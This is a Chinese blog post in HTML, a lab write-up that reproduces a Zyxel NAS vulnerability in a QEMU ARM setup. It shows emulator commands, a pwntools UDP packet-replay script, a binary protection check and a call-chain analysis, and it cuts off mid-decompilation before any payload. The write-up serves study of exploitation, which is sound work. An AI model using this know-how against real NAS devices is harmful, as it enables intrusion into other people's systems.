@@ -1,0 +1,431 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP） | Cyberangel's Blog</title><meta name="author" content="Cyberangel"><meta name="copyright" content="Cyberangel"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="《IoT从入门到入土》(10-2)–Zyxel-NAS漏洞复现（ARM32–Hijack GOT、UDP）  本篇文章我们会基于前面模拟的环境来复现该漏洞。 前置知识： [PWN入门（2-1-6）-格式化字符串漏洞-hijack GOT](..&#x2F;..&#x2F;PWN&#x2F;CTF-PWN系列&#x2F;PWN入门&#x2F;PWN入门（2-1-6）-格式化字符串漏洞-hijack">
+<meta property="og:type" content="article">
+<meta property="og:title" content="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）">
+<meta property="og:url" content="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/index.html">
+<meta property="og:site_name" content="Cyberangel&#39;s Blog">
+<meta property="og:description" content="《IoT从入门到入土》(10-2)–Zyxel-NAS漏洞复现（ARM32–Hijack GOT、UDP）  本篇文章我们会基于前面模拟的环境来复现该漏洞。 前置知识： [PWN入门（2-1-6）-格式化字符串漏洞-hijack GOT](..&#x2F;..&#x2F;PWN&#x2F;CTF-PWN系列&#x2F;PWN入门&#x2F;PWN入门（2-1-6）-格式化字符串漏洞-hijack">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picsum.photos/seed/blog-cover-07/800/450">
+<meta property="article:published_time" content="2022-11-25T01:47:22.000Z">
+<meta property="article:modified_time" content="2026-07-03T14:46:17.838Z">
+<meta property="article:author" content="Cyberangel">
+<meta property="article:tag" content="二进制安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picsum.photos/seed/blog-cover-07/800/450"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）",
+  "url": "https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/",
+  "image": "https://picsum.photos/seed/blog-cover-07/800/450",
+  "datePublished": "2022-11-25T01:47:22.000Z",
+  "dateModified": "2026-07-03T14:46:17.838Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Cyberangel",
+      "url": "https://elydemiurge.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Cyberangel's Blog" type="application/atom+xml">
+</head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">467</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://picsum.photos/seed/blog-cover-07/800/450);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Cyberangel's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-25T01:47:22.000Z" title="发表于 2022-11-25 09:47:22">2022-11-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-07-03T14:46:17.838Z" title="更新于 2026-07-03 22:46:17">2026-07-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/">公开知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/">《IoT从入门到入土》</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>15分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="《IoT从入门到入土》-10-2-–Zyxel-NAS漏洞复现（ARM32–Hijack-GOT、UDP）"><a href="#《IoT从入门到入土》-10-2-–Zyxel-NAS漏洞复现（ARM32–Hijack-GOT、UDP）" class="headerlink" title="《IoT从入门到入土》(10-2)–Zyxel-NAS漏洞复现（ARM32–Hijack GOT、UDP）"></a>《IoT从入门到入土》(10-2)–Zyxel-NAS漏洞复现（ARM32–Hijack GOT、UDP）</h1><blockquote>
+<ul>
+<li>本篇文章我们会基于前面模拟的环境来复现该漏洞。</li>
+<li>前置知识：<ul>
+<li>[PWN入门（2-1-6）-格式化字符串漏洞-hijack GOT](..&#x2F;..&#x2F;PWN&#x2F;CTF-PWN系列&#x2F;PWN入门&#x2F;PWN入门（2-1-6）-格式化字符串漏洞-hijack GOT&#x2F;PWN入门（2-1-6）-格式化字符串漏洞-hijack GOT.md)</li>
+<li><a href="../../PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E8%BF%9B%E9%98%B6/PWN%E8%BF%9B%E9%98%B6%EF%BC%881-8%EF%BC%89-ret2dlresolve(1)%EF%BC%88%E9%AB%98%E7%BA%A7ROP%EF%BC%89/PWN%E8%BF%9B%E9%98%B6%EF%BC%881-8%EF%BC%89-ret2dlresolve(1)%EF%BC%88%E9%AB%98%E7%BA%A7ROP%EF%BC%89.md">PWN进阶（1-8）-ret2dlresolve(1)（高级ROP）</a><br> 【了解got与plt】</li>
+</ul>
+</li>
+<li>附件：链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1IkFKidiMqy8EpXayZntvaQ">https://pan.baidu.com/s/1IkFKidiMqy8EpXayZntvaQ</a> 提取码: bz8d</li>
+<li>本文首发于IOTsec-Zone</li>
+</ul>
+</blockquote>
+<h2 id="1、启动模拟环境"><a href="#1、启动模拟环境" class="headerlink" title="1、启动模拟环境"></a>1、启动模拟环境</h2><p>当你关闭qemu后若想要重新启动模拟环境就需要依次执行下面的所有命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Ubuntu虚拟机--------------------------------------------------------------------------------</span></span><br><span class="line">$ <span class="built_in">sudo</span> tunctl -t tap0</span><br><span class="line">$ <span class="built_in">sudo</span> ifconfig tap0 192.168.5.2/24</span><br><span class="line">$ <span class="built_in">sudo</span> qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">  -initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">  -drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">  -append <span class="string">&quot;root=/dev/mmcblk0p2&quot;</span> -smp 2,cores=2 \</span><br><span class="line">  -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br><span class="line"><span class="comment"># qemu----------------------------------------------------------------------------------------</span></span><br><span class="line">$ ifconfig eth0 down									<span class="comment"># 重启qemu之后网卡名称会重新变回eth0</span></span><br><span class="line">$ ip <span class="built_in">link</span> <span class="built_in">set</span> eth0 name egiga0</span><br><span class="line">$ ifconfig egiga0 up</span><br><span class="line">$ ifconfig egiga0 192.168.5.1/24</span><br><span class="line">$ mount -o <span class="built_in">bind</span> /dev ./rootfs/dev &amp;&amp; mount -t proc /proc ./rootfs/proc</span><br><span class="line">$ mount -vt sysfs sysfs ./rootfs/sys</span><br><span class="line">$ <span class="built_in">chroot</span> ./rootfs sh</span><br><span class="line">$ nsuagent</span><br><span class="line"><span class="comment"># 新建终端--------------------------------------------------------------------------------------</span></span><br><span class="line">$ scp ./gdbserver-armel-static-8.0.1 root@192.168.5.1:/root/rootfs/</span><br><span class="line">$ ssh root@192.168.5.1</span><br><span class="line">$ <span class="built_in">chroot</span> ./rootfs sh</span><br><span class="line">$ <span class="built_in">chmod</span> +x ./gdbserver-armel-static-8.0.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669341661983-be0e8974-f3e8-40c6-8037-6ab1206eb8ba.png" alt="image.png"></p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669341913604-025bd34d-30e6-4459-95bd-bb97733f8d5e.png" alt="image.png"></p>
+<h2 id="2、开始pwn"><a href="#2、开始pwn" class="headerlink" title="2、开始pwn"></a>2、开始pwn</h2><h3 id="①、收集信息"><a href="#①、收集信息" class="headerlink" title="①、收集信息"></a>①、收集信息</h3><p>由于Crossover在运行Windows软件时开销过大，所以本篇文章中我们大多数时候使用pwndbg取代IDA的动态调试功能、使用python的pwntools库实现UDP流量包的重放。</p>
+<blockquote>
+<ul>
+<li>注：wireshark软件本身不支持重放。</li>
+</ul>
+</blockquote>
+<p>使用wireshark打开上一节中抓取的流量包，查看发送含有我们账号密码的认证数据包：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669595005821-74058693-addf-4508-90a7-19caa374f87b.png" alt="image.png"></p>
+<p>将上面的所有的16进制复制下来，使用pwntools进行重放UDP，所以我们有如下代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">accept</span>():</span><br><span class="line">    l=listen(<span class="number">50127</span>, typ=<span class="string">&#x27;udp&#x27;</span>)	<span class="comment"># 监听本地（Ubuntu）的50127端口</span></span><br><span class="line">    l.wait_for_connection()</span><br><span class="line">    <span class="built_in">print</span>(l.recv(<span class="number">100</span>))			<span class="comment"># 接收100字节应该够了</span></span><br><span class="line">    l.close()</span><br><span class="line"></span><br><span class="line">thread = Thread(target=accept)</span><br><span class="line">thread.start()</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;192.168.5.1&#x27;</span>, <span class="number">50127</span>, typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line">data=<span class="built_in">bytes</span>.fromhex(</span><br><span class="line">    <span class="string">&quot;00420241001c42af5b3a004f525400123456555345524e414d453a6379626572616e67656c0950415353574f52443a6379626572616e67656c0953484152455f5245513a30094654505f5245513a30&quot;</span>)</span><br><span class="line">p.send(data)</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669595291426-dcfdde8d-961c-42b7-b56e-44e430e4aeee.png" alt="image.png"></p>
+<p>嗯，看起来挺成功。现在就按照常见的pwn流程来吧，首先检查可执行文件的保护：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669596109311-017bf9f9-6f66-4fbe-b352-fdb15c5aaccd.png" alt="image.png"></p>
+<ul>
+<li><code>No RELRO</code> ：GOT、PLT完全没有任何保护（详情可参照： PWN进阶（1-8）-ret2dlresolve(1)（高级ROP） ）。</li>
+<li><code>No canary found</code> ：没有canary保护。</li>
+<li><code>NX enabled</code> ：栈不可执行。</li>
+<li><code>No PIE</code> ：虽然程序没有开启PIE保护，但这并不意味着加载的动态链接库和其栈地址一定不变，因为我们并不知道实机上ASLR的保护等级（如下图所示），这里需要按照可变地址来考虑…</li>
+</ul>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669596867170-2ee5679f-d4bc-47a8-a2a0-6e59bb269579.png" alt="image.png"></p>
+<h3 id="②、寻找调用链"><a href="#②、寻找调用链" class="headerlink" title="②、寻找调用链"></a>②、寻找调用链</h3><p>对存在漏洞的<code>sub_14C60</code>函数交叉引用发现有许多函数调用了它：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669597303703-2cb2ce70-cad7-44af-a7cf-2815b74ccaed.png" alt="image.png"></p>
+<p>我们并不清楚调用链，但是可以通过gdb获取：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669597697532-7cafbf02-a24b-4584-b7b1-8fb5c4638c2a.png" alt="image.png"></p>
+<p>gdb-client连接上后会自动断在<code>recvfrom</code>函数：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669598547996-ed244c26-a00b-49ff-843c-2d90cecde63a.png" alt="image.png"></p>
+<p>对地址<code>0x14C60</code>下断点，run后再次执行我们的<code>exp1.py</code>：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669598655041-4baaa481-95cb-4817-a40c-5f92f946e5a0.png" alt="image.png"></p>
+<p>不知道是不是由于gdbserver的原因，很不幸的是我们无法通过<code>bt</code>或<code>frame</code>知道函数的调用过程，提示错误<code>corrupt stack</code>；但仍旧可以通过<code>寄存器R14（LR）</code>知道调用该函数的父函数：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669598812498-71348508-2887-4716-9d42-8630898cda0f.png" alt="image.png"></p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669598904176-8146d069-d554-48cc-8e10-0b62aec8a1f4.png" alt="image.png"></p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669599047263-d0c5776e-342a-441e-97a5-d8a0210c9997.png" alt="image.png"></p>
+<p>因此调用链为：<code>main_function(sub_123EC) -&gt; sub_1AEE4 -&gt; sub_14C60(vuln_fucntion)</code>。大致的看一下发现<code>sub_1AEE4</code>有多达5处调用了<code>sub_14C60</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">sub_1AEE4</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  v31 = &amp;unk_34D48;</span><br><span class="line">  sub_159F8(a1, <span class="number">0</span>);</span><br><span class="line">  sub_14C60(a1, <span class="string">&quot;[%s][%d] Start with m_bIsWirelessEnabled = %d\n&quot;</span>, <span class="string">&quot;Run&quot;</span>, <span class="number">1320</span>, *(<span class="type">unsigned</span> __int8 *)(a1 + <span class="number">32</span>));</span><br><span class="line">  sub_15474(a1);</span><br><span class="line">  <span class="built_in">std</span>::operator+&lt;<span class="type">char</span>&gt;((<span class="type">int</span>)v32, <span class="string">&quot;|dstart|NDU Agent started: &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            addr_len = <span class="number">16</span>;</span><br><span class="line">            recvfrom(*(_DWORD *)(a1 + <span class="number">300</span>), buf, <span class="number">0x10D8u</span>, <span class="number">0</span>, &amp;addr, &amp;addr_len);</span><br><span class="line">            v2 = sub_1BC48(buf, v40);</span><br><span class="line">            v3 = inet_ntoa(*(<span class="keyword">struct</span> in_addr *)&amp;addr.sa_data[<span class="number">2</span>]);</span><br><span class="line">            sub_14C60(a1, <span class="string">&quot;[%s][%d] GOT YOU!!!!!!, pcode = %d, ip address: %s\n&quot;</span>, <span class="string">&quot;Run&quot;</span>, <span class="number">1342</span>, v2, v3);<span class="comment">// sub_1AEE4 -&gt; sub_14C60</span></span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">          &#125;</span><br><span class="line">          v4 = v2 == <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v2 != <span class="number">2</span> )</span><br><span class="line">            v4 = v2 == <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !v4 )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( dword_34E9C )</span><br><span class="line">          &#123;</span><br><span class="line">            v5 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;response packet. escape&quot;</span>);</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(v5);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">          <span class="comment">// ...</span></span><br><span class="line">      &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    sub_14C60(</span><br><span class="line">      a1,</span><br><span class="line">      <span class="string">&quot;AuthMac: %X:%X:%X:%X:%X:%X\n&quot;</span>,</span><br><span class="line">      (<span class="type">unsigned</span> __int8)v41,</span><br><span class="line">      BYTE1(v41),</span><br><span class="line">      BYTE2(v41),</span><br><span class="line">      HIBYTE(v41),</span><br><span class="line">      (<span class="type">unsigned</span> __int8)v42,</span><br><span class="line">      HIBYTE(v42));</span><br><span class="line">    sub_14C60(a1, <span class="string">&quot;LocalMac1: %X:%X:%X:%X:%X:%X\n&quot;</span>, v16, v17, v18, 